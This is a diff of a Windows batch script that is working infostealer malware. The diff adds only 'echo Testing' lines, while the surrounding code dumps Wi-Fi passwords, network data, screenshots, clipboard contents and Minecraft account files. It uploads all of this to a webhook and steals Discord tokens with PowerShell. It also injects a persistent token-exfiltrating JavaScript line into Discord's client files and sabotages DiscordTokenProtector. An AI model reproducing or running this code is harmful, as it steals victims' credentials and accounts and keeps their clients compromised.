@@ -42,18 +42,18 @@ for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
     netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
    
 )
-
+echo Testing ... Testing 
 :aftertesti
-
+echo Testing ... Testing 
 ::gets the ipconfig (also local ip)
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
-
+echo Testing ... Testing 
 ::gets the info about the netstat
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
-
+echo Testing ... Testing 
 ::sends the launcher_accounts.json if minecraft exist
 if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end
-
+echo Testing ... Testing 
 ::makes and sends a screenshot
 echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
 echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
@@ -82,24 +82,31 @@ echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 
 echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
 timeout 1 >NUL
 Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
-
+echo Testing ... Testing 
 ::sends the username, ip, current time, and date of the victim
-
-
+echo Testing ... Testing 
+echo Testing ... Testing 
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 ::sends all files
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
+echo Testing ... Testing 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
+echo Testing ... Testing 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
+echo Testing ... Testing 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
+echo Testing ... Testing 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
+echo Testing ... Testing 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
+echo Testing ... Testing 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
+echo Testing ... Testing 
  
 
 ::grabbs the token
-
+echo Testing ... Testing 
 echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testtttt.ps1
 echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testtttt.ps1
 echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
@@ -158,7 +165,7 @@ echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
 echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testtttt.ps1
 echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testtttt.ps1
 Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testtttt.ps1
-
+echo Testing ... Testing 
 set /a app = 0 
 set /a voice = 0
 if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
@@ -178,7 +185,7 @@ if %killdc% == 1 goto d
 goto e
 :d
 ::coded by baum#2873
-
+echo Testing ... Testing 
 ::DiscordTokenProtector Fucker
 taskkill /im Discord.exe /f
 taskkill /im DiscordTokenProtector.exe /f
@@ -201,7 +208,7 @@ echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenPro
 echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-
+echo Testing ... Testing 
 ::deletes all temp files
 del %userprofile%\AppData\Local\Temp\ip.txt 
 del %userprofile%\AppData\Local\Temp\ipp.txt 
